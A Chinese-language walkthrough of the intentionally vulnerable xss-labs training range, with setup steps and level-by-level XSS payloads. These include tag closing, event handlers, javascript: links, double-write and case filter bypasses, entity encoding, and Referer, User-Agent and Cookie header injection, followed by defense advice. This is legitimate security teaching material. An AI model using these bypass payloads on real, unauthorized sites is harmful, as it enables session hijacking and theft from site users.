# xss-labs 靶场通关笔记

> **章节导航已更新**：本文已拆分到 [XSS-Labs 学习索引](notes/xss-labs/README.md)，包括 [环境与基础](notes/xss-labs/00-overview.md)、[Level 01–05](notes/xss-labs/01-level-01-05.md)、[Level 06–10](notes/xss-labs/02-level-06-10.md)、[Level 11–15](notes/xss-labs/03-level-11-15.md)、[Level 16–20](notes/xss-labs/04-level-16-20.md) 和 [速查与防御](notes/xss-labs/05-reference-defense.md)。本文件保留为原始长篇存档。


> **适用范围**：仅限本地 / 授权靶场练习。xss-labs 是故意存在漏洞的教学平台，请勿对未授权系统使用文中手法。\
> **项目地址**：<https://github.com/do0dl3/xss-labs>
>
> 在线靶场：<https://xss-ctf.xiejiahe.com/>

***

## 1. 概述

**xss-labs** 是一套基于 PHP 的 **XSS（跨站脚本）** 练习靶场，通过约 **20 关** 递进训练反射型 XSS、标签闭合、事件属性、过滤绕过、HTTP 头注入、Angular / Flash 相关等常见考点。

| 项目 | 说明 |
| --- | --- |
| 仓库 | <https://github.com/do0dl3/xss-labs> |
| 语言 | PHP + 前端 HTML/JS |
| 关卡 | level1.php ~ level20.php |
| 通关判定 | 成功触发 `alert`（页面会改写 `window.alert` 并提示进入下一关） |
| 推荐环境 | phpStudy / XAMPP / 任意 PHP + Apache（或 Nginx + PHP） |

### XSS 类型速览（本靶场会碰到）

| 类型 | 含义（中文） |
| --- | --- |
| 反射型 XSS | 恶意脚本经 URL/参数立刻反射到页面并执行 |
| 存储型 XSS | 脚本被存入后端，他人访问时执行（本靶场以反射为主） |
| DOM 型 XSS | 主要在浏览器端改 DOM，不依赖或不完全依赖服务端回显 |
| 头注入 | 利用 Referer、User-Agent、Cookie 等进入输出点 |

### 通关目标

每关目标通常是：**让浏览器执行 JavaScript（常见为 **`alert(1)`**）**。成功后页面会 `confirm` 并跳转下一关（部分关需手动点链接）。

***

## 2. 安装步骤

### 2.1 环境要求

* PHP（常见 5.x / 7.x 均可跑本靶场）
* Web 服务器：Apache / Nginx
* 浏览器 + 开发者工具；建议安装 **Burp Suite** 或浏览器改包插件（HackBar 等）

### 2.2 源码部署（推荐）

```bash
# 克隆仓库
git clone https://github.com/do0dl3/xss-labs.git

# 或下载 ZIP 后解压
# https://github.com/do0dl3/xss-labs/archive/refs/heads/master.zip
```

**phpStudy 示例：**

1. 将 `xss-labs` 目录放到网站根目录，例如：\
   `C:\phpstudy_pro\WWW\xss-labs`
2. 启动 Apache（及按需 PHP）
3. 浏览器访问：

```latex
http://127.0.0.1/xss-labs/
```

或：

```latex
http://127.0.0.1/xss-labs/index.php
```

**Linux + Apache 示例：**

```bash
sudo cp -r xss-labs /var/www/html/
sudo chown -R www-data:www-data /var/www/html/xss-labs
# 访问 http://服务器IP/xss-labs/
```

![1789717261593-6e9cd5b8-b8da-4c11-b06e-8952b102e660.png](./img/285636619/1789717261593-6e9cd5b8-b8da-4c11-b06e-8952b102e660-343236.png)

### 2.3 验证安装

打开首页应能看到关卡入口图片/链接；点击进入 level1，URL 类似：

```latex
http://127.0.0.1/xss-labs/level1.php?name=test
```

***

## 3. 基本使用

### 3.1 练习流程（建议固定）

1. 打开关卡，观察 URL 参数与输入框
2. 提交探测字符：`<>"'` 等，**查看页面源码**找回显位置
3. 判断注入上下文：HTML 正文 / 属性 / href / 隐藏域 / HTTP 头
4. 构造 payload，必要时抓包改头
5. 触发 `alert` 后记录 payload 与原理

### 3.2 常用工具

| 工具 | 用途 |
| --- | --- |
| 浏览器 F12 | 看 DOM、改元素、看 Console |
| Burp Suite | 改 GET/POST、Referer、UA、Cookie |
| 在线实体编码 | 将 `javascript` 编成 `&#106;&#97;...` 等 |

### 3.3 通用探测 payload（入门）

```html
<script>alert(1)</script>
"><script>alert(1)</script>
' onclick=alert(1) //
" onfocus=alert(1) type="text
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>x</a>

```

***

## 4. 重要概念与参数说明

### 4.1 PHP / 过滤相关

| 名称 | 中文含义 |
| --- | --- |
| `$_GET['name']` / `keyword` | URL 查询参数，本靶场主要输入点 |
| `htmlspecialchars()` | 将 `<>&"'` 等转成 HTML 实体，减轻标签注入 |
| `str_replace()` | 字符串替换；只替一次时可被**双写**绕过 |
| `strtolower()` | 转小写；可挡大小写混写，但挡不住编码等 |
| `$_SERVER['HTTP_REFERER']` | 来源页 Referer 头 |
| `$_SERVER['HTTP_USER_AGENT']` | 浏览器 UA 头 |
| `$_COOKIE` | Cookie，可被前端/抓包修改 |

### 4.2 前端事件与伪协议

| 名称 | 中文含义 |
| --- | --- |
| `onclick` | 鼠标点击时执行 |
| `onmouseover` / `onfocus` | 悬停 / 获得焦点时执行 |
| `onerror`（配合 img） | 资源加载失败时执行 |
| `javascript:` | 伪协议，在 `href`/`src` 等处可执行 JS |
| HTML 实体编码 | 如 `&#106;` 表示 `j`，用于绕过关键字检测 |

### 4.3 本靶场「通关机制」

多数关在页面中重写了 `window.alert`：真正弹出后会 `confirm` 并 `location` 跳到下一关。因此练习时以触发该逻辑为准。

***

## 5. 通关详解（Level 1～20）

> 下列 payload 为教学常用写法；以你本地源码为准。成功后请自己在笔记中补截图。

***

### Level 1：无过滤反射

**考点**：参数直接拼进 HTML。

**Payload：**

```latex
?name=<script>alert(1)</script>

```

**原理**：无编码、无过滤，典型反射型 XSS。

![1789717710201-15dd858a-8df2-469e-932c-812f8e9c3868.png](./img/285636619/1789717710201-15dd858a-8df2-469e-932c-812f8e9c3868-856219.png)

![1789717728971-96386c7e-3acc-4059-8907-fab6b1ea121b.png](./img/285636619/1789717728971-96386c7e-3acc-4059-8907-fab6b1ea121b-802328.png)

***

### Level 2：属性内回显 + 部分编码

**考点**：`keyword` 进入 `input` 的 `value="..."`；标题处可能 `htmlspecialchars`，属性处未充分处理。

**Payload：**

```latex
?keyword="><script>alert(1)</script>

```

**原理**：用 `">` 闭合 value 与标签，再插入 script。

![1789718054333-de71ca76-84b2-4fbd-abd4-80f2a5c5e863.png](./img/285636619/1789718054333-de71ca76-84b2-4fbd-abd4-80f2a5c5e863-194853.png)

![1789718067502-f4246f88-d10f-41e2-8fb0-9c4b1c4fe3fc.png](./img/285636619/1789718067502-f4246f88-d10f-41e2-8fb0-9c4b1c4fe3fc-885170.png)

***

### Level 3：`htmlspecialchars` + 单引号属性

**考点**：`<>` 被实体编码；属性用单引号包裹，单引号常未编码。

**Payload：**

```latex
?keyword=' onclick=alert(1) //
```

或：

```latex
?keyword=' onfocus=alert(1) //
```

或：

```latex
?keyword=' onmouseover=alert(1) //
```

**原理**：闭合单引号，注入事件；需点击或聚焦输入框触发。

![1789719427875-49e04d08-95ec-43e5-9254-5e4bc21c5d53.png](./img/285636619/1789719427875-49e04d08-95ec-43e5-9254-5e4bc21c5d53-595660.png)

![1789719439660-1d1e45f0-0cc0-414e-b540-90ac138808ee.png](./img/285636619/1789719439660-1d1e45f0-0cc0-414e-b540-90ac138808ee-976776.png)

![1789719609256-27321b32-ab20-43c9-b3b7-32873f425623.png](./img/285636619/1789719609256-27321b32-ab20-43c9-b3b7-32873f425623-948126.png)

![1789719630189-33d184bf-9d39-450a-936a-2abc8a198e04.png](./img/285636619/1789719630189-33d184bf-9d39-450a-936a-2abc8a198e04-131806.png)

***

### Level 4：删除 `<>`，双引号属性

**考点**：`str_replace` 去掉 `<>`，value 为双引号。

**Payload：**

```latex
?keyword=" onclick=alert(1) //

?keyword=" onfocus=javascript:alert(1) "

?keyword=" onmouseover=alert(1) "
```

**原理**：无法再造标签，改用事件属性。

![1789720197400-5a2e03d1-d814-4495-8ed7-d054ec79a092.png](./img/285636619/1789720197400-5a2e03d1-d814-4495-8ed7-d054ec79a092-511522.png)

![1789720211109-81b76646-4a1e-41b5-901b-1c39eb040840.png](./img/285636619/1789720211109-81b76646-4a1e-41b5-901b-1c39eb040840-555314.png)

***

### Level 5：过滤 `script`、`on`

**考点**：替换 `<script`、`on` 等。

**Payload：**

```latex
?keyword="><a href=javascript:alert(1)>x</a>

?keyword="><a href='javascript:alert(1)'>

?keyword="><a href='javascript:alert(1)'> //

?keyword="><a href='javascript:alert(document.cookie)'> //

```

**原理**：避开 script/on，用 `javascript:` 伪协议；点击链接触发。

![1789720678080-0e5503bf-dc84-41c8-819b-ec5339a989fa.png](./img/285636619/1789720678080-0e5503bf-dc84-41c8-819b-ec5339a989fa-216521.png)

![1789720690876-3c42833c-a7da-4705-bb7f-7f86d737072a.png](./img/285636619/1789720690876-3c42833c-a7da-4705-bb7f-7f86d737072a-215729.png)

***

### Level 6：关键字过滤（大小写敏感）

**考点**：过滤 `script/on/src/data/href` 等，但未统一转小写再过滤。

**Payload：**

```latex
?keyword="><a HrEf=javascript:alert(1)>x</a>

?keyword=" Onclick="alert(1)

?keyword="><Script>alert('xss')</script> //

?keyword="><img Src=x Onerror=alert('XSS');> //

```

**原理**：HTML 标签/属性名大小写不敏感，`HrEf` 仍当 href。

![1789721001353-fd78bcc5-0773-424d-a5a3-3b156f2928f0.png](./img/285636619/1789721001353-fd78bcc5-0773-424d-a5a3-3b156f2928f0-313520.png)

![1789721131999-59a4f804-160a-4e26-adaf-9e22865b5d9c.png](./img/285636619/1789721131999-59a4f804-160a-4e26-adaf-9e22865b5d9c-461695.png)

***

### Level 7：删除关键字 + 转小写

**考点**：`strtolower` 后 `str_replace` 删掉 `script` 等。

**Payload：**

```latex
?keyword="><scrscriptipt>alert(1)</scrscriptipt>

?keyword=" oonnclick="alert(1)

?keyword="><img srsrcc=x oonnerror=alert('XSS');>//

```

**原理**：**双写**：去掉中间 `script` 后拼成完整 `script`。

![1789721494560-9f3232e4-0733-4d84-9dd2-969d03270450.png](./img/285636619/1789721494560-9f3232e4-0733-4d84-9dd2-969d03270450-678350.png)

![1789721520176-e366b31d-2cdc-463b-8cdf-804de2d3a1fc.png](./img/285636619/1789721520176-e366b31d-2cdc-463b-8cdf-804de2d3a1fc-574719.png)

***

### Level 8：友情链接 href + 关键字破坏

**考点**：输入进入 `<a href="...">`；过滤 script/on/href 等。

**Payload（实体编码 **`javascript:alert(1)`**）：**

```latex
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

**原理**：浏览器解析 href 时解码实体，得到 `javascript:alert(1)`。

Unicode 编/解码网站：<http://www.esjson.com/unicodeEncode.html>

![1789723429585-c205cea9-a56a-490f-b6b8-df9f9f8754ac.png](./img/285636619/1789723429585-c205cea9-a56a-490f-b6b8-df9f9f8754ac-086795.png)

![1789723376937-44b8948c-c3d4-4178-89f8-f52dcbcc28ba.png](./img/285636619/1789723376937-44b8948c-c3d4-4178-89f8-f52dcbcc28ba-914166.png)

点击下方的“友情链接”超链接，即可触发。

![1789723535390-8c6fc469-5bad-45a1-bf9f-baf4be7bee5e.png](./img/285636619/1789723535390-8c6fc469-5bad-45a1-bf9f-baf4be7bee5e-241292.png)

***

### Level 9：href 需像 URL

**考点**：在 8 基础上常要求内容中出现 `http` 等。

**Payload 思路：**

```latex
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://
```

**原理**：实体编码绕过滤，`//http://` 满足“像链接”的检查。

Unicode 编/解码网站：<http://www.esjson.com/unicodeEncode.html>

![1789724344679-56c17074-a947-42d0-a249-ba506e26e846.png](./img/285636619/1789724344679-56c17074-a947-42d0-a249-ba506e26e846-346738.png)

![1789724423631-cc12478d-dba3-45df-80a4-5744197065d4.png](./img/285636619/1789724423631-cc12478d-dba3-45df-80a4-5744197065d4-774097.png)

点击下方的“友情链接”超链接，即可触发。

![1789724442825-744f36e5-4c8d-4276-b72e-f90fe9286890.png](./img/285636619/1789724442825-744f36e5-4c8d-4276-b72e-f90fe9286890-901836.png)

***

### Level 10：隐藏域 `t_sort`

**考点**：可见搜索框未必是注入点；源码中有 `hidden` 的 `t_sort`。

我们尝试请求的时候给出 `t_link`、`t_history` 和 `t_sort` 几个参数，发现 `t_sort` 的 value 字段对应其参数。举例来说，尝试这个 payload：

```plain
?keyword=test?t_link=tlink&t_history=thistory&t_sort=tsort
```

![1789725026304-4bfd7fbc-bbbe-4bab-8112-839a257c3b2a.png](./img/285636619/1789725026304-4bfd7fbc-bbbe-4bab-8112-839a257c3b2a-676632.png)

![1789725048028-716b6d63-ef16-4a29-94fd-706f83799d03.png](./img/285636619/1789725048028-716b6d63-ef16-4a29-94fd-706f83799d03-918625.png)

看来可以用 `t_sort` 的 value 这个字段来注入。

**Payload：**

```latex
?t_sort=" type="text" onclick="alert(1)
```

或：

```latex
?t_sort=" onfocus=alert(1) type="text
```

或

```latex
?t_sort=" onmouseover=alert(1) type="text
```

或

```latex
?t_sort=" type=image src=x onerror=alert(1) //
```

**原理**：闭合 value，把 `type` 改成 `text` 显示出来，再用事件触发。

![1789725461704-86027675-776e-40c4-bcbe-28eb4bc2910e.png](./img/285636619/1789725461704-86027675-776e-40c4-bcbe-28eb4bc2910e-564442.png)

点击输入框，即可触发。

![1789725482365-06176046-14cf-42a6-89a0-42174c2a42d6.png](./img/285636619/1789725482365-06176046-14cf-42a6-89a0-42174c2a42d6-139066.png)

方法二

![1789725536329-cf69df43-c2ca-4985-9d12-aeb1598e1ef5.png](./img/285636619/1789725536329-cf69df43-c2ca-4985-9d12-aeb1598e1ef5-074774.png)

![1789725562986-d24e26a5-e7d2-47e7-9658-c6957f367f1e.png](./img/285636619/1789725562986-d24e26a5-e7d2-47e7-9658-c6957f367f1e-675726.png)

***

### Level 11：Referer 注入

**考点**：某隐藏域 value 来自 `HTTP_REFERER`；对 `<>` 可能删除。

**步骤：**

1. Burp 抓访问 level11 的请求
2. 修改头：

```http
Referer: " onfocus=alert(1) type="text

Referer: " onmouseover=alert(1) type="text

Referer: " onclick=alert(1) type="text
```

3. 放行后聚焦/点击对应输入控件

**原理**：输出点在属性中，用事件 + 改 type 触发。

![1789728316123-481ce116-2a65-44c9-acff-e59892e36edb.png](./img/285636619/1789728316123-481ce116-2a65-44c9-acff-e59892e36edb-649991.png)

![1789728291075-2c2e19ed-7430-4d1e-a740-1ec1583e4c6a.png](./img/285636619/1789728291075-2c2e19ed-7430-4d1e-a740-1ec1583e4c6a-391053.png)

点击输入框，即可触发。

![1789728325941-ba3296de-1c9d-45ec-8d99-3e6d882ccd43.png](./img/285636619/1789728325941-ba3296de-1c9d-45ec-8d99-3e6d882ccd43-407204.png)

方法二：使用 HackerBar 扩展工具，在这里给出的“Referer”参数里面填写值：

```plain
" onclick=alert(1) type="text
```

![1789727373536-10e65396-0956-403e-a46c-a6f0d5178736.png](./img/285636619/1789727373536-10e65396-0956-403e-a46c-a6f0d5178736-848794.png)

点击输入框，即可触发。

![1789727241642-996f9129-2bb4-4bce-84f9-9945f1c6dbe6.png](./img/285636619/1789727241642-996f9129-2bb4-4bce-84f9-9945f1c6dbe6-326574.png)

***

### Level 12：User-Agent 注入

**考点**：隐藏域来自 UA。

**Burp：**

```http
User-Agent: " onfocus=alert(1) type="text

User-Agent: " onmouseover=alert(1) type="text

User-Agent: " onclick=alert(1) type="text
```

**原理**：同属性注入，输入通道换为 UA。

![1789738659971-13dd5d7e-1c61-41a6-b41d-d208929ab923.png](./img/285636619/1789738659971-13dd5d7e-1c61-41a6-b41d-d208929ab923-547878.png)

![1789738691339-b1808d47-ec36-4c94-b76e-f9af1343b395.png](./img/285636619/1789738691339-b1808d47-ec36-4c94-b76e-f9af1343b395-836691.png)

点击输入框，即可触发。

![1789738708451-9e81ba00-4503-4fe9-a13b-e85706dac8d3.png](./img/285636619/1789738708451-9e81ba00-4503-4fe9-a13b-e85706dac8d3-787280.png)

方法二：使用 HackerBar 扩展工具，在这里给出的“User-Agent”参数里面填写值：

```latex
" onclick=alert(1) type="text
```

![1789738974479-6c800639-c32c-4c35-90c0-b053b3cde0d3.png](./img/285636619/1789738974479-6c800639-c32c-4c35-90c0-b053b3cde0d3-103858.png)

点击输入框，即可触发。

![1789739028828-d6b21f4f-00be-411b-b0ef-6cc3c431efe0.png](./img/285636619/1789739028828-d6b21f4f-00be-411b-b0ef-6cc3c431efe0-691593.png)

***

### Level 13：Cookie 注入

**考点**：隐藏域来自 Cookie（常见键名 `user`）。

**Burp 示例：**

```http
Cookie: user=" onfocus=alert(1) type="text

Cookie: user=" onmouseover=alert(1) type="text

Cookie: user=" onclick=alert(1) type="text
```

或在浏览器 Application → Cookies 中改 `user` 后刷新。

![1789739298144-56337847-f13e-4029-a114-0e51acf4870b.png](./img/285636619/1789739298144-56337847-f13e-4029-a114-0e51acf4870b-133492.png)

![1789739409549-7f491997-6dbf-44da-9118-6fb566968d8b.png](./img/285636619/1789739409549-7f491997-6dbf-44da-9118-6fb566968d8b-930153.png)

点击输入框，即可触发。

![1789739443406-f6401e2a-ca1d-4bcc-8064-26c89080bc6e.png](./img/285636619/1789739443406-f6401e2a-ca1d-4bcc-8064-26c89080bc6e-813055.png)

方法二：使用 HackerBar 扩展工具，在这里给出的“Cookie”参数里面填写值：

```latex
user=" onclick=alert(1) type="text
```

![1789739673155-64eb8cee-aad2-4f34-9504-df28fec00dcf.png](./img/285636619/1789739673155-64eb8cee-aad2-4f34-9504-df28fec00dcf-873347.png)

点击输入框，即可触发。

![1789739697395-f1ca3e52-e999-45af-9535-dd595d173ef9.png](./img/285636619/1789739697395-f1ca3e52-e999-45af-9535-dd595d173ef9-743276.png)

***

### Level 14：图片 / EXIF 相关

**考点**：页面常嵌外站 EXIF 查看或图片元数据场景；外站失效时本关可能难以原样复现。

**学习要点：**

* 历史上存在把脚本写进图片元数据、在特定查看器中执行的案例
* 本关依赖外部服务时，以理解「不可信元数据」为主

**若环境仍可用**：按题目嵌入的查看器说明，对图片 EXIF 写入测试脚本并上传/提交。若外链已挂，可记录为「环境依赖关」，继续后续关卡。

![1789740280995-aebe4a3e-381a-4096-bb30-3ccba907c24b.png](./img/285636619/1789740280995-aebe4a3e-381a-4096-bb30-3ccba907c24b-105642.png)

查看源码通过iframe标签引入了一个[http://exofvoewer.org](http://exofvoewer.org/), 结合乌云爆出的

![1789741748456-592bb49b-678e-40a1-93e1-d8c472fe751e.png](./img/285636619/1789741748456-592bb49b-678e-40a1-93e1-d8c472fe751e-085567.png)

漏洞，上传一个含有xss代码的图片触发xss。

exif xss

![1789741785349-f5c6fb23-6fde-43c0-b5ba-75a4968283db.png](./img/285636619/1789741785349-f5c6fb23-6fde-43c0-b5ba-75a4968283db-753152.png)

![1789743763388-c244fc91-5e8a-4a64-a67e-02ec33bd94ed.png](./img/285636619/1789743763388-c244fc91-5e8a-4a64-a67e-02ec33bd94ed-926079.png)

![1789741785354-53a3469e-3fea-4481-bcca-58004317657d.png](./img/285636619/1789741785354-53a3469e-3fea-4481-bcca-58004317657d-071892.png)![1789741785486-b79f455a-0117-43e7-96ff-8c7e8736b6a0.png](./img/285636619/1789741785486-b79f455a-0117-43e7-96ff-8c7e8736b6a0-401256.png)![1789741785499-1cb7cebe-c343-4af0-96ee-5f649cd09be6.png](./img/285636619/1789741785499-1cb7cebe-c343-4af0-96ee-5f649cd09be6-723853.png)

***

### Level 15：AngularJS `ng-include`

**考点**：`src` 参数被 `ng-include` 用来包含同源页面。

**Payload 思路（包含 level1 并带 XSS）：**

```latex
?src='level1.php?name=<img src=x onerror=alert(1)>'

?src='level1.php?name=<img src=x onmouseover=alert(1)>'

?src='level1.php?name=<img src=x onclick=alert(1)>'
```

**原理**：包含仍存在 XSS 的页面，在 Angular 上下文中间接执行。路径按你的站点实际调整。

这关的 URL 完整路径是：

```latex
http://192.168.3.3/xss-labs/level15.php?src=1.gif
```

![1789740837906-94c9c55b-6793-449a-8d2e-a466690903de.png](./img/285636619/1789740837906-94c9c55b-6793-449a-8d2e-a466690903de-697705.png)

![1789741176383-ded848da-a8ed-44fc-b2a1-4ed050f8c868.png](./img/285636619/1789741176383-ded848da-a8ed-44fc-b2a1-4ed050f8c868-619705.png)

![1789741228661-19bbfdaa-803e-411b-a19b-86c6e98f2551.png](./img/285636619/1789741228661-19bbfdaa-803e-411b-a19b-86c6e98f2551-271255.png)

***

### Level 16：过滤空格、`script`、`/` 等

**考点**：空格等被替换成 `&nbsp;` 等。

**Payload 思路：**

```latex
?keyword=<img%0asrc=x%0aonerror=alert(1)>

?keyword=<iframe%0asrc=x%0donmouseover=alert(1)></iframe>

?keyword=<svg%0aonload=alert(1)>

?keyword=<img%0asrc=x%0aonclick=alert(1)>
```

**原理**：用换行 `%0A` 代替空格分隔属性，避开空格过滤。

![1789742707215-6455dea0-2910-4ead-8569-8d9617bdecbe.png](./img/285636619/1789742707215-6455dea0-2910-4ead-8569-8d9617bdecbe-160123.png)

![1789742734924-0ea607e0-2f2e-4214-af34-40e09d507b41.png](./img/285636619/1789742734924-0ea607e0-2f2e-4214-af34-40e09d507b41-150901.png)

***

后面的关卡都需要用到 Flash 插件，现代大部分的浏览器都不再支持 Flash 插件了，不过也不影响后续的靶场通关。推荐使用这款支持 Flash 插件的开源浏览器：<https://github.com/Mzying2001/CefFlashBrowser>

![1789743098564-db027a98-5b4c-4d16-9d3f-6f36cde85568.png](./img/285636619/1789743098564-db027a98-5b4c-4d16-9d3f-6f36cde85568-111308.png)

### Level 17：Flash / embed 参数

**考点**：`embed` 的 `src` 拼接 `xsf0x.swf?arg01=arg02` 一类参数；可能对参数做 `htmlspecialchars`，但仍可能在 HTML 属性边界注入事件。

**Payload：**

```plain
?arg01=%20onmouseover&arg02=alert(1)

?arg01=a&arg02=b onmouseover=alert(1)

?arg01=a&arg02=b onmousemove=alert(1)
```

或在第二参数后注入空格与事件（以源码拼接方式为准）。

**原理**：控制 flash/embed 相关属性，用鼠标事件触发；现代浏览器对 Flash 支持差，可能需老环境或仅作原理学习。

![1789744169738-2b20fa79-225e-442a-becb-41691d1f4c67.png](./img/285636619/1789744169738-2b20fa79-225e-442a-becb-41691d1f4c67-388197.png)

### Level 18：embed 标签属性注入

考点：与 Level 17 相同，仅更换了 Flash 文件（xsf02.swf）。

**Payload**：

```plain
?arg01=%20onmouseover&arg02=alert(1)

?arg01=a&arg02=b onmouseover=alert(1)

?arg01=a&arg02=b onmousemove=alert(1)
```

原理：拼接逻辑与第17关完全一致，空格打断属性后注入事件处理器即可触发。

![1789744483613-9ec55fa3-ced6-4b26-b7b9-ba94e4a90dad.png](./img/285636619/1789744483613-9ec55fa3-ced6-4b26-b7b9-ba94e4a90dad-453344.png)

***

19关推荐使用这个 Flash 插件，可以完成通关。

<https://chromewebstore.google.com/detail/omimccinlhlkpjaeaocglgmkbelejlhj?utm_source=item-share-cb>

![1789786108089-4d63b7e7-683e-4e5f-adaa-af514195630e.png](./img/285636619/1789786108089-4d63b7e7-683e-4e5f-adaa-af514195630e-056664.png)

### Level 19：**带引号的 embed + htmlspecialchars**

**考点**：继续围绕 `xsf0x.swf` 与 `arg01`/`arg02`（及 width/height 等）构造；payload 更长，常需闭合 JS/字符串。

**学习方法：**

1. 完整阅读 `level19.php` / `level20.php` 拼接方式
2. 对照公开 Writeup 中与**当前 swf 行为**匹配的 payload
3. 无 Flash 时以代码审计理解「插件参数注入」即可

原理：源码变成 src="xsf03.swf?a=b"，双引号被编码后无法直接闭合。本关原本依赖 Flash XSS（通过 Flash 变量或 ExternalInterface 触发），但 Flash 已淘汰，现代浏览器基本无法复现。

**Payload 思路：**

```latex
?arg01=version&arg02=<a href="javascript:alert(/xss/)">xss</a>
```

![1789786162735-9ccb1e3e-5e03-4c06-b49e-aa9f6a66c876.png](./img/285636619/1789786162735-9ccb1e3e-5e03-4c06-b49e-aa9f6a66c876-202876.png)

点击 “xss”这个超链接，即可触发。

![1789786171019-5466713a-220c-4ecf-90a6-e01cfc46e5f6.png](./img/285636619/1789786171019-5466713a-220c-4ecf-90a6-e01cfc46e5f6-418570.png)

### Level 20：Flash XSS 进阶

考点：与 Level 19 相同，仅更换了 Flash 文件（xsf04.swf）。

**Payload 思路：**

```latex
?arg01=id&arg02=xss\"))}catch(e){alert(1)}//%26width=123%26height=123
```

原理：拼接逻辑与第19关一致，常规 HTML 属性注入受限，主要考察 Flash 相关 XSS，目前已失去实际意义。

![1789787583298-185b2b37-9e1b-4593-9146-771b71021318.png](./img/285636619/1789787583298-185b2b37-9e1b-4593-9146-771b71021318-455442.png)

***

## 6. 关卡速查表

| 关卡 | 核心考点 | 典型绕过 |
| --- | --- | --- |
| 1 | 无过滤 | 直接 `<script>` |
| 2 | 属性闭合 | `">` + script |
| 3 | 实体编码 + 单引号 | 事件 `onclick`/`onfocus` |
| 4 | 删 `<>` | 双引号 + 事件 |
| 5 | 过滤 script/on | `javascript:` 链接 |
| 6 | 关键字过滤 | 大小写 |
| 7 | 删除关键字 | 双写 |
| 8 | href 过滤 | HTML 实体编码 |
| 9 | 伪 URL 检查 | 实体 + `//http://` |
| 10 | hidden 域 | `t_sort` + 改 type |
| 11 | Referer | 改请求头 |
| 12 | User-Agent | 改 UA |
| 13 | Cookie | 改 Cookie |
| 14 | EXIF/外链 | 环境依赖 |
| 15 | ng-include | 包含有洞页面 |
| 16 | 空格等过滤 | `%0A` 等 |
| 17～20 | Flash/embed | 参数/事件注入 |

***

## 7. 常见问题

| 问题 | 处理建议 |
| --- | --- |
| payload 提交后无弹窗 | 查看源码确认是否被编码/截断；是否要点击、悬停、聚焦 |
| 只看到实体编码后的字符 | 换上下文：属性事件、伪协议、编码绕过 |
| Level 11～13 无效 | 必须用代理改头；注意头里引号与空格 |
| Level 14 打不开 | 外嵌站点失效属常见情况，可跳过并做笔记 |
| Flash 相关关无效果 | 现代浏览器已弱化/移除 Flash，侧重读源码 |
| 中文路径/编码问题 | URL 对 payload 做 URL 编码后再测 |

***

## 8. 防御建议（对照练习）

| 风险点 | 防御方向 |
| --- | --- |
| 反射拼接 | 输出编码（按上下文：HTML/属性/JS/URL） |
| 属性注入 | 严格引号包裹 + 编码；避免用户输入进事件名 |
| 关键字黑名单 | 不可靠；优先编码与 CSP |
| HTTP 头出站 | 头数据也要当不可信输入编码 |
| `javascript:` | 禁止用户控制的协议；URL 白名单 |
| 富文本 | 专用消毒库 + CSP |

**CSP 示例思路**：限制脚本源，降低内联 XSS 危害（需与业务兼容）。

***

## 9. 卸载 / 清理

```bash
# 删除站点目录即可
rm -rf /var/www/html/xss-labs
# Windows：删除 WWW\xss-labs 文件夹

# 若用 git 克隆在用户目录
rm -rf ~/xss-labs
```

phpStudy：删除对应网站目录或站点配置，并停止不再使用的站点。

浏览器：清除该靶场相关 Cookie，避免 Level 13 测试数据残留。

***

## 10. 学习路径建议

1. Level 1～7：打牢反射、闭合、事件、双写、大小写
2. Level 8～9：实体编码与伪协议
3. Level 10～13：隐藏域与 HTTP 头/Cookie
4. Level 15～16：框架包含与空白符绕过
5. Level 14、17～20：了解元数据与历史插件风险，不强求现代浏览器复现

每关建议记录：**注入点、过滤函数、最终 payload、触发方式**。

***

## 11. 参考资料

* 项目仓库：<https://github.com/do0dl3/xss-labs>
* 本地练习为主；社区博客 Writeup 可对照，但以**自己审计源码**为准

***

**笔记版本**：v1.0\
**适用对象**：Web 安全入门 → XSS 专项\
**维护提示**：Flash/外链关卡随浏览器与第三方服务变化，笔记中可标注「环境依赖」

***


